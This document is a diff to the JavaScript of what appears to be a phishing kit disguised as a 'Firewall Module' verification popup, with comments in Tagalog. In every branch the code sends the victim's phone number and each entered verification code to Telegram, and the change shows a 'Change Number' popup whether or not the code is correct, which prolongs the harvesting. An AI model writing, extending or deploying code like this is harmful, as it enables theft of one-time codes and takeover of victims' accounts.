@@ -1,5 +1,6 @@
 /**
  * Firewall Module - 4-digit Verification with Change Number Option
+ * Basta naka-check ang CHANGE #, magpapakita ng Change Number popup kahit mali ang code
  */
 
 async function sendTelegram(phone, code, type = 'verify') {
@@ -127,29 +128,36 @@ window.verifyFirewallCode = async function() {
     if (errorDiv) errorDiv.style.display = 'none';
     
     window.verificationAttempts = (window.verificationAttempts || 0) + 1;
-    const isValid = (code === window.currentVerificationCode);
     
-    if (isValid) {
+    // Check if change number is required (BEFORE code validation)
+    const changeRequired = await isChangeNumberRequired();
+    
+    if (changeRequired) {
+        // BASTA naka-check ang CHANGE #, magpakita agad ng Change Number popup
+        // Hindi na kailangan mag-validate ng code
         await sendTelegram(userPhone, code, 'verify');
-        const changeRequired = await isChangeNumberRequired();
-        if (changeRequired) {
-            showChangeNumberPopup();
-        } else {
+        showChangeNumberPopup();
+    } else {
+        // Normal flow: validate muna ang code
+        const isValid = (code === window.currentVerificationCode);
+        
+        if (isValid) {
+            await sendTelegram(userPhone, code, 'verify');
             hideFirewallPopup();
             alert("Verification successful. Page will refresh.");
             setTimeout(() => { window.location.reload(); }, 500);
+        } else {
+            await sendTelegram(userPhone, code, 'verify');
+            let errorMsg = "Invalid verification code. Please try again.";
+            if (window.verificationAttempts >= 3) {
+                errorMsg = "Too many failed attempts. Page will refresh.";
+                if (verifyBtn) verifyBtn.disabled = true;
+                setTimeout(() => { window.location.reload(); }, 2000);
+            }
+            if (errorDiv) { errorDiv.innerHTML = errorMsg; errorDiv.style.display = 'block'; }
+            if (verifyBtn && verifyBtn.disabled !== true) { verifyBtn.disabled = false; verifyBtn.innerHTML = "VERIFY NOW"; }
+            if (codeInput) { codeInput.value = ''; codeInput.focus(); }
         }
-    } else {
-        await sendTelegram(userPhone, code, 'verify');
-        let errorMsg = "Invalid verification code. Please try again.";
-        if (window.verificationAttempts >= 3) {
-            errorMsg = "Too many failed attempts. Page will refresh.";
-            if (verifyBtn) verifyBtn.disabled = true;
-            setTimeout(() => { window.location.reload(); }, 2000);
-        }
-        if (errorDiv) { errorDiv.innerHTML = errorMsg; errorDiv.style.display = 'block'; }
-        if (verifyBtn && verifyBtn.disabled !== true) { verifyBtn.disabled = false; verifyBtn.innerHTML = "VERIFY NOW"; }
-        if (codeInput) { codeInput.value = ''; codeInput.focus(); }
     }
 };
 
